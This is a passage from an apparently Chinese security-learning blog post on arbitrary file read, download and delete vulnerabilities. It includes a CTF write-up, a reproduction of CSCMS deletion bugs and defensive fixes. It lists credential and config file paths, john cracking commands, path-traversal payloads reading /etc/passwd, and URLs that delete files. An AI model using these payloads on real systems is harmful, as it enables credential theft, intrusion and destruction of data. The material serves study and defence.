+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/root/.ssh/id_rsa  私钥<br>/root/.ssh/authorized_keys  公钥存储文件<br>/root/.ssh/id_rsa.keystore<br>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥<br></code></pre></td></tr></tbody></table></figure>
+<p>私钥文件如果没有设定密码保护，便可直接获取到进行登录到服务器，或使用xshell等软件选择证书登录。<br>
+<code>ssh -i id_rsa root@IP地址</code></p>
+<p><strong>系统密码</strong></p>
+<ul>
+<li><code>/etc/passwd</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root:x:0:0:root:/root:/bin/bash<br>bin:x:1:1:bin:/bin:/sbin/nologin<br>......<br>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell<br></code></pre></td></tr></tbody></table></figure>
+<p>可以看到哪些用户可以登录</p>
+<ul>
+<li><code>/etc/shadow</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root:$1$v2wT9rQF$XSpGgoB93STC4EFSlgpjg1:14181:0:99999:7:::<br>$id$salt$密文<br></code></pre></td></tr></tbody></table></figure>
+<p>id代表的是使用不同的加密算法，不同的系统使用的算法也不尽相同。salt是加密的时候需要用到盐。最后就是密文。<br>
+注意：如果密码字符串为*，表示系统用户不能被登入，为!表示用户名被禁用，如果密码字符串为空，表示没有密码。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">格式</th>
+<th style="text-align:center">算法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">$1</td>
+<td style="text-align:center">md5</td>
+</tr>
+<tr>
+<td style="text-align:center">$2a</td>
+<td style="text-align:center">blowfish</td>
+</tr>
+<tr>
+<td style="text-align:center">$2y</td>
+<td style="text-align:center">blowfish</td>
+</tr>
+<tr>
+<td style="text-align:center">$5</td>
+<td style="text-align:center">sha-256</td>
+</tr>
+<tr>
+<td style="text-align:center">$6</td>
+<td style="text-align:center">sha-512</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>在线查询
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
+</ul>
+</li>
+<li>john破解<br>
+<code>unshadow /etc/passwd /etc/shadow &gt; test_passwd</code><br>
+<code>john --wordlist=字典路径 test_passw</code><br>
+默认密码字典位于<code>/usr/share/john/password.ls</code></li>
+</ul>
+<h4 id="6-3-全路径">6.3 全路径</h4>
+<p>mlocate.db数据库里存储了本地所有文件的配置信息<br>
+<code>/var/lib/mlocate/mlocate.db</code><br>
+利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息<br>
+<code>locate mlocate.db config</code>把包含config的路径全输出出来<br>
+<code>locate mlocate.db webapps</code><br>
+<code>locate mlocate.db www</code><br>
+获取到路径后可以进一步挖掘敏感信息和系统漏洞</p>
+<h3 id="7-程序源代码">7. 程序源代码</h3>
+<p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。<br>
+读取<code>WEB-INF/web.xml</code>，进一步读取class文件，反编译得到源码。<br>
+读取war包，反编译获取源码。</p>
+<h3 id="8-应用配置文件">8. 应用配置文件</h3>
+<p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p>
+<ul>
+<li>java站点<br>
+<code>/WEB-INF/web.xml</code><br>
+<code>/WEB-INF/classes/applicationContext.xml</code><br>
+<code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br>
+<code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li>
+<li>tomcat<br>
+<code>/usr/local/tomcat/conf/tomcat-users.xml</code></li>
+<li>nginx<br>
+<code>/www/nginx/conf/nginx.conf</code><br>
+<code>/etc/nginx/nginx.conf</code><br>
+<code>/usr/local/nginx/conf/nginx.conf</code><br>
+<code>/usr/local/etc/nginx/nginx.conf</code></li>
+<li>apache<br>
+<code>/etc/httpd/conf/httpd.conf</code><br>
+<code>/etc/apache2/apache2.conf</code><br>
+<code>/etc/apache2/httpd.conf</code></li>
+<li>redis<br>
+<code>/etc/redis.conf</code></li>
+<li>ssh<br>
+<code>/etc/ssh/sshd_config</code></li>
+</ul>
+<h3 id="9-应用日志文件">9. 应用日志文件</h3>
+<p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p>
+<ul>
+<li>tomcat<br>
+可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径<br>
+<code>/webapps/ROOT/logs/catalina.out</code></li>
+<li>apache<br>
+<code>/var/log/apache2/access.log</code><br>
+<code>/var/log/apache2/error.log</code><br>
+<code>/var/log/httpd/access_log</code><br>
+<code>/etc/httpd/logs/access_log</code><br>
+<code>/etc/httpd/logs/error_log</code><br>
+<code>/etc/httpd/logs/error.log</code></li>
+<li>nginx<br>
+<code>/var/log/nginx/access.log</code><br>
+<code>/var/log/nginx/error.log</code><br>
+<code>/usr/local/var/log/nginx/access.log</code><br>
+<code>/usr/local/nginx/logs</code></li>
+</ul>
+<h3 id="10-Windows下的利用姿势">10. Windows下的利用姿势</h3>
+<h4 id="10-1-盲读取桌面文件">10.1 盲读取桌面文件</h4>
+<p>有些时候，管理员会图方便，在桌面存储一些敏感的文件，我们可以直接对桌面的一些文件名进行fuzz，比如1.txt、2.txt、密码.txt、pass.txt等等，进一步扩大战果。</p>
+<h3 id="5-任意文件下载漏洞">5. 任意文件下载漏洞</h3>
+<p>一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。<br>
+<strong>漏洞产生原因</strong></p>
+<ul>
+<li>有读取文件的函数</li>
+<li>读物文件的路径用户可控，且没有经过校验，或者校验不严格</li>
+<li>输出文件内容</li>
+<li>一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字</li>
+</ul>
+<p><strong>文件下载的两种方式</strong><br>
+1、直接下载：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;a href=”http://www.a.com/xxx.rar”&gt;下载&lt;/a&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>2、增加header头</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h1&gt;开始下载文件&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Type: imgage/jpeg'</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Disposition: attachment; filename='</span>.<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Lengh: '</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230620210400811.png" alt="image-20230620210400811"></p>
+<p><strong>利用思路</strong></p>
+<ul>
+<li>下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</li>
+<li>下载各种<code>.log</code>文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</li>
+<li>下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。</li>
+</ul>
+<p>尝试读取<code>/root/.bash_history</code>看自己是否具有root权限。<br>
+如果没有，就只能利用<code>../</code>来回跳转读取一些<code>.ssh</code>下的配置信息文件。<br>
+读取mysql下的<code>.bash_history</code>文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载需要审计的代码文件，但是下载的时候变得很繁琐，只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。</p>
+<p><strong>常见利用方式</strong></p>
+<h5 id="java-oracle环境">java+oracle环境</h5>
+<p>可以先下载/WEB-INF/classes/applicationContext.xml  文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/aaa.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器。</p>
+<p>也可以先下载网站的配置文件，在根目录/WEB-INF/Web.xml的(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)。</p>
+<h5 id="具有root权限">具有root权限</h5>
+<p>在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。<br>
+当不知道路径是什么的情况下，这个可以说是一个非常好用的了，我们利用任意文件下载漏洞将mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。<br>
+<strong>locate 读取方法</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">locate mlocate.db admin<br></code></pre></td></tr></tbody></table></figure>
+<p>可以将<code>mlocate.db</code>中包含<code>admin</code>内容全部输出来。</p>
+<p><img src="image-20230517004844697.png" alt="image-20230517004844697"></p>
+<p>利用这个文件可以获取到该服务器任何我们想要的内容并下载出来而不用一个一个去猜解目录，但是这个文件只有root用户才能读取。另一方面我们也可以利用linux内核的一个文件<code>/proc/self/cmdline</code>当前进程的<code>cmdline</code>参数，可以获取到路径信息。</p>
+<p><strong>总的来说，任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</strong></p>
+<h3 id="6-任意文件读取与下载漏洞验证">6. 任意文件读取与下载漏洞验证</h3>
+<h4 id="任意文件读取验证">任意文件读取验证</h4>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'f'</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p>测试：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">readfile.php?f=../../../../../../etc/passwd<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230517005251981.png" alt="image-20230517005251981"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">readfile.php?f=../index.txt<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230517005423143.png" alt="image-20230517005423143"></p>
+<p><code>file://</code>伪协议 ，读取文件内容</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">readfile.php?f=file:///etc/passwd<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230517005348620.png" alt="image-20230517005348620"></p>
+<h4 id="任意文件下载验证">任意文件下载验证</h4>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'f'</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Type: imgage/jpeg'</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Disposition: attachment; filename='</span>.<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Lengh: '</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230517005508702.png" alt="image-20230517005508702"></p>
+<p>当然，我下载的这个文件并没有内容。</p>
+<h3 id="7-漏洞判断">7. 漏洞判断</h3>
+<p>参数<code>f</code>的参数值为PHP文件时：</p>
+<blockquote>
+<p>1.文件被解析，则是文件包含漏洞<br>
+2.显示源代码，则是文件读取漏洞<br>
+3.提示下载，则是文件下载漏洞</p>
+</blockquote>
+<h3 id="8-漏洞利用实战">8. 漏洞利用实战</h3>
+<p>我学习任意文件读取与下载漏洞，就是因为遇到了一个任意文件读取与下载漏洞的Web题，所以在此实战一下</p>
+<h4 id="RoarCTF2019-Web：Easy-Java-跟着复现吧">RoarCTF2019-Web：Easy Java(跟着复现吧)</h4>
+<p><img src="image-20230517010611860.png" alt="image-20230517010611860"></p>
+<p>不是弱口令，也不能扫出目录。只有一个<code>help.docx</code>文件可以下载。于是可能是任意文件下载漏洞。<br>
+点击蓝字“help”，抓包，发包。发现GET方式一直什么都下载不了。后来修改为POST，就可以下载了。</p>
+<p>此时url：download，猜测是文件下载漏洞, 如下图发现filename参数可控</p>
+<p><img src="image-20230517010657527.png" alt="image-20230517010657527"></p>
+<p><img src="image-20230517010849954.png" alt="image-20230517010849954"></p>
+<p>没啥用, 补充一下java web的目录结构</p>
+<p><img src="image-20230517010916910.png" alt="image-20230517010916910"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">敏感目录<br>（1） /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>（2） /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>（3） /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>（4） /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>（5）/WEB-INF/database.properties：数据库配置文件<br></code></pre></td></tr></tbody></table></figure>
+<p>WEB-INF/web.xml泄露</p>
+<p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。<br>
+漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
+<p>POST访问WEB-INF/web.xml, 发现</p>
+<p><img src="image-20230517011531280.png" alt="image-20230517011531280"></p>
+<p>没错, 搞心态的</p>
+<p><img src="image-20230517011558062.png" alt="image-20230517011558062">参照之前，想尝试访问/WEB-INF/web.xml得到文件但是失败了，查看源码发现有个地方是要求POST方式传入</p>
+<p><img src="image-20230517011957700.png" alt="image-20230517011957700"></p>
+<p><img src="image-20230517012042801.png" alt="image-20230517012042801"></p>
+<p><img src="image-20230517012050842.png" alt="image-20230517012050842"></p>
+<p>发现如下</p>
+<p><img src="image-20230517012108710.png" alt="image-20230517012108710"></p>
+<p>发现操作flag的关键文件位置，读取(或下载)<code>/WEB-INF/classes/</code>下的flag的关键文件位置，又因为Java字节码类文件（<code>.class</code>）是Java编译器编译Java源文件（<code>.java</code>）产生的“目标文件”。<br>
+最终得出flag的关键文件位置为：<code>/WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
+<p><img src="image-20230517012448121.png" alt="image-20230517012448121"></p>
+<p>base64解码即可</p>
+<h3 id="9-漏洞防御修复">9. 漏洞防御修复</h3>
+<p><strong>通用</strong></p>
+<ul>
+<li>过滤 <code>.</code> 点，使用户在url中不能回溯上级目录</li>
+<li>正则严格判断用户输入的参数</li>
+<li><code>php.ini</code>配置<code>open_basedir</code>限定文件访问范围</li>
+</ul>
+<p><strong>文件下载漏洞修复</strong></p>
+<ul>
+<li>将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：<code>www.test.com/download?filename=文件名</code></li>
+<li>净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。</li>
+<li>web应用程序可以使用chroot环境包含被访问的web目录，或者使用绝对路径+参数来访问文件目录时, 使其即使越权也在访问目录之内。www目录就是一个chroot应用。由chroot创造出的那个根目录，叫做“chroot监狱”(所谓”监狱”就是指通过chroot机制来更改某个进程所能看到的根目录，即将某进程限制在指定目录中，保证该进程只能对该目录及其子目录的文件有所动作，从而保证整个服务器的安全。<br>
+详细具体chroot的用法，可参考：<code>blog.csdn.net/frozen_fish/article/details/2244870</code></li>
+<li>任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。</li>
+<li>要下载的文件地址保存至数据库中。</li>
+<li>文件路径保存至数据库，让用户提交文件对应ID下载文件。</li>
+<li>用户下载文件之前需要进行权限判断。</li>
+<li>文件放在web无法直接访问的目录下。</li>
+<li>不允许提供目录遍历服务。</li>
+<li>公开文件可放置在web应用程序下载目录中通过链接进行下载。</li>
+<li>记录文件下载日志。</li>
+</ul>
+<h2 id="0x03-文件删除">0x03 文件删除</h2>
+<h3 id="1-1-漏洞描述">1.1 漏洞描述</h3>
+<p>​		应用程序在删除文件前，未对所要删除的文件内容、类型、文件名、文件目录做合法性校验，导致可删除服务器上任意文件，比如删除安装目录中锁文件，直接进行重装应用系统。</p>
+<p>​		攻击者从寻找上删除的功能，正常删除功能的文件没有经过校验或者不严格，攻击者控制这个可操作的变量配合目录遍历进行删除其他文件。这里涉及到一个<code>unlink()</code>函数，这个函数的作用是删除对应的文件及文件内容。</p>
+<h3 id="1-2-应用场景">1.2 应用场景</h3>
+<p>删除文件、附件、图片、替换、配置等</p>
+<h3 id="1-3-漏洞危害">1.3 漏洞危害</h3>
+<p>攻击者利用此漏洞可直接删除web目录甚至服务器上任意格式文件，直接导致业务系统中断、崩溃。</p>
+<h3 id="1-4-漏洞实例-不知为何-这种漏洞的文章太少了-先跟着复现吧">1.4 漏洞实例(不知为何, 这种漏洞的文章太少了, 先跟着复现吧)</h3>
+<h4 id="1-4-1-环境搭建-看了半天才发现-现在的漏洞已经被修复了…">1.4.1 环境搭建(看了半天才发现, 现在的漏洞已经被修复了…)</h4>
+<p>因此我借鉴之前有漏洞的情况, 把关键代码写上去吧</p>
+<p>CSCMS ：<a target="_blank" rel="noopener" href="http://www.chshcms.com">http://www.chshcms.com</a><br>
+网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）<br>
+程序源码下载：<a target="_blank" rel="noopener" href="https://github.com/chshcms/cscms">https://github.com/chshcms/cscms</a></p>
+<h5 id="漏洞实例一">漏洞实例一</h5>
+<p>漏洞文件位置：\cscms\plugins\sys\admin\Basedb.php  第160-177行：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//备份删除</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span>{<br>		<span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"//"</span>,<span class="hljs-string">"/"</span>,<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">".."</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$this</span>-&gt;input-&gt;<span class="hljs-title function_ invoke__">get_post</span>(<span class="hljs-string">'id'</span>,<span class="hljs-literal">true</span>)));<br>        <span class="hljs-comment">//修复前</span><br>        <span class="hljs-comment">//$dir = $this-&gt;input-&gt;get_post('id', true);</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$dir</span>)){<br>			<span class="hljs-title function_ invoke__">getjson</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">'plub_11'</span>));<br>		}<br>		<span class="hljs-variable">$dirs</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$dir</span>)){<br>			<span class="hljs-variable">$dirs</span>[] = <span class="hljs-variable">$dir</span>;<br>		}<span class="hljs-keyword">else</span>{<br>			<span class="hljs-variable">$dirs</span> = <span class="hljs-variable">$dir</span>;<br>		}<br>		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dirs</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$dir</span>) {<br>            <span class="hljs-title function_ invoke__">deldir</span>(FCPATH.<span class="hljs-string">'attachment/backup/'</span>.<span class="hljs-variable">$dir</span>);<br>		}<br>		<span class="hljs-variable">$info</span>[<span class="hljs-string">'msg'</span>] = <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">'plub_12'</span>);<br>		<span class="hljs-variable">$info</span>[<span class="hljs-string">'url'</span>] = <span class="hljs-title function_ invoke__">site_url</span>(<span class="hljs-string">'basedb/restore'</span>).<span class="hljs-string">'?v='</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>);<br>        <span class="hljs-title function_ invoke__">getjson</span>(<span class="hljs-variable">$info</span>,<span class="hljs-number">0</span>);<br>	}<br></code></pre></td></tr></tbody></table></figure>
+<p>漏洞利用：<br>
+1、根目录下新建test目录作为测试：</p>
+<p><img src="image-20230517160903389.png" alt="image-20230517160903389"></p>
+<p>2、构造参数成功删除test目录(环境看不懂咋搭建, 就算了吧)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/admin.php/basedb/del<br>POST:id=..\\..\\test<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230517161534835.png" alt="image-20230517161534835"></p>
+<h5 id="漏洞实例二">漏洞实例二</h5>
+<p>漏洞文件位置：/plugins/sys/admin/Skin.php 第418–440行：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//文件删除</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable">$ac</span> = <span class="hljs-variable language_">$this</span>-&gt;input-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'ac'</span>,<span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$op</span> = <span class="hljs-variable language_">$this</span>-&gt;input-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'op'</span>,<span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"."</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$this</span>-&gt;input-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'dirs'</span>,<span class="hljs-literal">true</span>));<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">".."</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$this</span>-&gt;input-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'file'</span>));<br>        <span class="hljs-comment">//修复前</span><br>        <span class="hljs-comment">//$dir = $this-&gt;input-&gt;get('dirs',true);</span><br>        <span class="hljs-comment">//$file = $this-&gt;input-&gt;get('file');</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$ac</span>!=<span class="hljs-string">'mobile'</span>) <span class="hljs-variable">$ac</span>=<span class="hljs-string">'pc'</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$op</span>!=<span class="hljs-string">'home'</span> &amp;&amp; <span class="hljs-variable">$op</span>!=<span class="hljs-string">'user'</span>) <span class="hljs-variable">$op</span>=<span class="hljs-string">'skins'</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$dir</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/^[\/]{1,}$/i"</span>,<span class="hljs-variable">$dir</span>)) <span class="hljs-title function_ invoke__">getjson</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">'plub_27'</span>));<br><br><br>        <span class="hljs-variable">$skin_dir</span> = VIEWPATH.<span class="hljs-variable">$ac</span>.FGF.<span class="hljs-variable">$op</span>.FGF.<span class="hljs-variable">$dir</span>.FGF.<span class="hljs-variable">$file</span>;<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$skin_dir</span>)) {  <span class="hljs-comment">//文件</span><br>              <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$skin_dir</span>);<br>		}<span class="hljs-keyword">else</span>{  <span class="hljs-comment">//目录</span><br>              <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">deldir</span>(<span class="hljs-variable">$skin_dir</span>);<br>		}<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>){<br>            <span class="hljs-variable">$info</span>[<span class="hljs-string">'url'</span>] = <span class="hljs-title function_ invoke__">site_url</span>(<span class="hljs-string">'skin'</span>).<span class="hljs-string">'?ac='</span>.<span class="hljs-variable">$ac</span>.<span class="hljs-string">'&amp;op='</span>.<span class="hljs-variable">$op</span>.<span class="hljs-string">'&amp;v='</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>);<br>            <span class="hljs-variable">$info</span>[<span class="hljs-string">'msg'</span>] = <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">'plub_46'</span>);<br>            <span class="hljs-variable">$info</span>[<span class="hljs-string">'turn'</span>] = <span class="hljs-number">1</span>;<br>            <span class="hljs-title function_ invoke__">getjson</span>(<span class="hljs-variable">$info</span>,<span class="hljs-number">0</span>);<br>		}<span class="hljs-keyword">else</span>{<br>            <span class="hljs-title function_ invoke__">getjson</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">'plub_28'</span>));<br>		}<br>	}<br></code></pre></td></tr></tbody></table></figure>
+<p>漏洞利用：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">网站根目录下新建1.txt文件作为测试，构造URL成功删除文件<br>Payload：http://127.0.0.1/admin.php/skin/del?ac=pc&amp;op=skins&amp;dirs=default&amp;file=..\\..\\..\\..\\1.txt<br></code></pre></td></tr></tbody></table></figure>
+<h5 id="漏洞实例三">漏洞实例三</h5>
